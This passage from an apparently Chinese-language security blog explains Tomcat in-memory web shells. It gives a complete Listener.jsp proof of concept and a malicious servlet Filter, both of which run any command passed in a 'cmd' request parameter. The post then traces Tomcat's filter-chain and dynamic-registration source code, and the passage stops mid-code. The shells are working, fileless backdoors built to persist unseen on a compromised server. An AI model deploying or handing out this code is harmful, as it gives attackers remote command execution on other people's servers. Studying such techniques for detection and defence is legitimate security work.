&#125;<br></code></pre></td></tr></table></figure><h4 id="获取StandardContext类"><a href="#获取StandardContext类" class="headerlink" title="获取StandardContext类"></a>获取StandardContext类</h4><p>在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <span class="hljs-comment">// Select the Context to be used for this Request</span><br>    <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> request.getContext();<br></code></pre></td></tr></table></figure><p>JSP内置了request对象,因此我们可以通过反射获取</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>也可以利用类加载器</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>再添加一下上面写的恶意Listener</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">shell_Listener</span> <span class="hljs-variable">shell_listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">shell_Listener</span>();<br>  context.addApplicationEventListener(shell_listener);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h4><p>Listener.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>           <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>           <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-keyword">try</span> &#123;<br>                   Runtime.getRuntime().exec(cmd);<br>               &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                   e.printStackTrace();<br>               &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                   n.printStackTrace();<br>               &#125;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Shell_Listener</span> <span class="hljs-variable">shell_Listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Listener</span>();<br>    context.addApplicationEventListener(shell_Listener);<br>%&gt;<br></code></pre></td></tr></table></figure><p>测试前，先将之前的Listener删除，先直接尝试命令执行，发现弹计算器失败，再访问一下Listener.jsp</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010211631.png" alt="image-20230201021155544"></p><p>此时Shell_Listener已经被加载进服务器，再次尝试弹计算器</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010212384.png" alt="image-20230201021249301"></p><h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><p>仿照Listener的思路，实现一个恶意Filter。Filter的调用是通过FilterChain实现的，具体流程如下</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010214825.png" alt="image-20230201021445758"></p><blockquote><p>只要重写doFilter方法即可</p></blockquote><p>恶意Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@WebFilter(&quot;/*&quot;)</span> <span class="hljs-comment">//应用到所有路由</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException | NullPointerException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010219311.png" alt="image-20230201021930234"></p><h4 id="Filter调用分析"><a href="#Filter调用分析" class="headerlink" title="Filter调用分析"></a>Filter调用分析</h4><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">doFilter:<span class="hljs-number">11</span>, Shell_Filter (Filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>invoke:<span class="hljs-number">197</span>, StandardWrapperValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">97</span>, StandardContextValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">540</span>, AuthenticatorBase (org.apache.catalina.authenticator)<br>invoke:<span class="hljs-number">135</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>跟进<code>ApplicationFilterChain#internalDoFilter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,ServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-comment">// Call the next filter if there is one</span><br>        <span class="hljs-keyword">if</span> (pos &lt; n) &#123;<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++];<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> filterConfig.getFilter(); <span class="hljs-comment">//获取Filter</span><br> <br>                <span class="hljs-keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(<br>                        filterConfig.getFilterDef().getAsyncSupported())) &#123;<br>                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);<br>                &#125;<br>                <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> request;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> response;<br>                    <span class="hljs-type">Principal</span> <span class="hljs-variable">principal</span> <span class="hljs-operator">=</span><br>                        ((HttpServletRequest) req).getUserPrincipal();<br> <br>                    Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;req, res, <span class="hljs-built_in">this</span>&#125;;<br>                    SecurityUtil.doAsPrivilege (<span class="hljs-string">&quot;doFilter&quot;</span>, filter, classType, args, principal);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    filter.doFilter(request, response, <span class="hljs-built_in">this</span>);<span class="hljs-comment">//* doFilter的调用</span><br>                &#125;<br>            &#125; <br>...<br>    &#125;<br></code></pre></td></tr></table></figure><p>查看一下获取Filter的机制，<code>filterConfig</code>是<code>filters</code>数组成员，一个<code>ApplicationFilterConfig</code>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> ApplicationFilterConfig[] filters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[<span class="hljs-number">0</span>];<br><span class="hljs-comment">//...</span><br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++]<br></code></pre></td></tr></table></figure><p>跟进查看一下<code>filters</code>数组的赋值时机,在<code>StandardWrapperValve#invoke()</code>方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>  <span class="hljs-comment">//...</span><br>    <span class="hljs-comment">// Create the filter chain for this request</span><br>  <span class="hljs-type">ApplicationFilterChain</span> <span class="hljs-variable">filterChain</span> <span class="hljs-operator">=</span> ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);<br></code></pre></td></tr></table></figure><p>跟进<code>createFilterChain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationFilterChain <span class="hljs-title function_">createFilterChain</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">            Wrapper wrapper, Servlet servlet)</span> &#123;<br>        <span class="hljs-comment">//...</span><br>        filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>(); <span class="hljs-comment">//创建一个空的filterChain</span><br>        filterChain.setServlet(servlet);<br>        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());<br> <br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<span class="hljs-comment">//得到StandardContext</span><br>        FilterMap filterMaps[] = context.findFilterMaps();<span class="hljs-comment">//获取其中的FilterMaps,里面存储里各Filter的信息</span><br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();<span class="hljs-comment">//获取名称</span><br> <br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123; <span class="hljs-comment">//遍历得到对应FilterConfig</span><br>            <span class="hljs-comment">//...</span><br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig)<br>                    context.findFilterConfig(filterMap.getFilterName());<br>            <span class="hljs-comment">//...</span><br>            filterChain.addFilter(filterConfig);<br>        &#125;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">return</span> filterChain;<span class="hljs-comment">//将获取到的ApplicationFilterConfig整合返回</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进<code>ApplicationFilterChain#addFilter</code>看一下添加机制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilter</span><span class="hljs-params">(ApplicationFilterConfig filterConfig)</span> &#123;<br>        <span class="hljs-comment">//防止重复添加</span><br>        <span class="hljs-keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;<br>            <span class="hljs-keyword">if</span>(filter==filterConfig) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (n == filters.length) &#123;<br>            ApplicationFilterConfig[] newFilters =<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[n + INCREMENT];<br>            System.arraycopy(filters, <span class="hljs-number">0</span>, newFilters, <span class="hljs-number">0</span>, n);<br>            filters = newFilters;<br>        &#125;<br>        filters[n++] = filterConfig;<br> <br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="Filter动态注册"><a href="#Filter动态注册" class="headerlink" title="Filter动态注册"></a>Filter动态注册</h4><p>通过上述流程可以知道，每次请求的 FilterChain 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig。这样程序创建时就可以找到添加的 Filter 了。</p><p>这里先说一个前提条件，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p><ol><li>使用 ServletContext 的 addFilter&#x2F;createFilter 方法注册；</li><li>使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册；</li><li>使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态）。</li></ol><p>这里只讨论第一种，并先关注比较重要的addFilter方法</p><p>在<code>ServletContext</code>接口中有声明了3个<code>addFilter</code>方法，其实现在 <code>org.apache.catalina.core.ApplicationContext#addFilter</code> 中。这里以Tomcat 10.0.23为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> FilterRegistration.Dynamic <span class="hljs-title function_">addFilter</span><span class="hljs-params">(String filterName,</span><br><span class="hljs-params">        String filterClass, Filter filter)</span> <span class="hljs-keyword">throws</span> IllegalStateException &#123;<br>    <span class="hljs-keyword">if</span> (filterName == <span class="hljs-literal">null</span> || filterName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<span class="hljs-comment">//filterName不能为空</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(sm.getString(<br>                <span class="hljs-string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));<br>    &#125;<br>  <span class="hljs-comment">//这里的context是StandardContext类型</span><br>    <span class="hljs-keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;<span class="hljs-comment">//判断context的state是否是程序刚启动的state</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br>                sm.getString(<span class="hljs-string">&quot;applicationContext.addFilter.ise&quot;</span>,<br>                        getContextPath()));<br>    &#125;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> context.findFilterDef(filterName);<span class="hljs-comment">//在context中根据 filterName 寻找FilterDef对象</span><br>    <span class="hljs-keyword">if</span> (filterDef == <span class="hljs-literal">null</span>) &#123;<br>        filterDef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilterName(filterName);<br>        context.addFilterDef(filterDef);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (filterDef.getFilterName() != <span class="hljs-literal">null</span> &amp;&amp;<br>                filterDef.getFilterClass() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//将Filter对象放入FilterDef中</span><br>    <span class="hljs-keyword">if</span> (filter == <span class="hljs-literal">null</span>) &#123;<br>        filterDef.setFilterClass(filterClass);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        filterDef.setFilterClass(filter.getClass().getName());<br>        filterDef.setFilter(filter);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterRegistration</span>(filterDef, context);<span class="hljs-comment">//包装FilterDef和context返回</span><br>&#125;<br></code></pre></td></tr></table></figure><p>从传参可以看出filterDef必要的属性为<code>filter</code>、<code>filterClass</code>以及<code>filterName</code>,动调一下会发现其实filterClass、filterName对应的其实就是web.xml中的<code>&lt;filter&gt;</code>标签。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;filter&gt;<br>    &lt;filter-name&gt;&lt;/filter-name&gt;<br>    &lt;filter-class&gt;&lt;/filter-class&gt;<br>&lt;/filter&gt;<br></code></pre></td></tr></table></figure><blockquote><p>并且可以发现<code>ApplicationContext </code>的 <code>addFilter</code> 中将 filter 初始化存在了 <code>StandardContext</code> 的 <code>filterDefs</code> 中,但我们之前分析的<code>FilterChain</code>中的Filter是在<code>StandardContext</code>的<code>filterMaps</code>里获取</p><p>这里可以跟进看一下Filter是怎么被添加到其他参数中的</p></blockquote><p>在 <code>StandardContext</code> 的 <code>filterStart</code> 方法中生成了 <code>filterConfigs</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">filterStart</span><span class="hljs-params">()</span> &#123;<br><br>        <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>            getLogger().debug(<span class="hljs-string">&quot;Starting filters&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// Instantiate and record a FilterConfig for each defined filter</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">ok</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">synchronized</span> (filterConfigs) &#123;<br>            filterConfigs.clear();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;<span class="hljs-comment">//遍历filterDefs</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> entry.getKey();<br>                <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>                    getLogger().debug(<span class="hljs-string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//创建ApplicationFilterConfig对象并存入filterConfigs中</span><br>                    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span><br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>(<span class="hljs-built_in">this</span>, entry.getValue());<br>                    filterConfigs.put(name, filterConfig);<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    t = ExceptionUtils.unwrapInvocationTargetException(t);<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.filterStart&quot;</span>, name), t);<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ok;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>完成<code>filterDefs</code>–&gt;<code>filterConfigs</code></p></blockquote><p>在 ApplicationFilterRegistration 的 <code>addMappingForUrlPatterns</code> 中生成了 <code>filterMaps</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addMappingForUrlPatterns</span><span class="hljs-params">(</span><br><span class="hljs-params">            EnumSet&lt;DispatcherType&gt; dispatcherTypes, <span class="hljs-type">boolean</span> isMatchAfter,</span><br><span class="hljs-params">            String... urlPatterns)</span> &#123;<br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.setFilterName(filterDef.getFilterName());<span class="hljs-comment">//从filterDef获取</span><br>        <span class="hljs-keyword">if</span> (dispatcherTypes != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (DispatcherType dispatcherType : dispatcherTypes) &#123;<br>                filterMap.setDispatcher(dispatcherType.name());<span class="hljs-comment">//给dispatcherMapping属性赋值</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (urlPatterns != <span 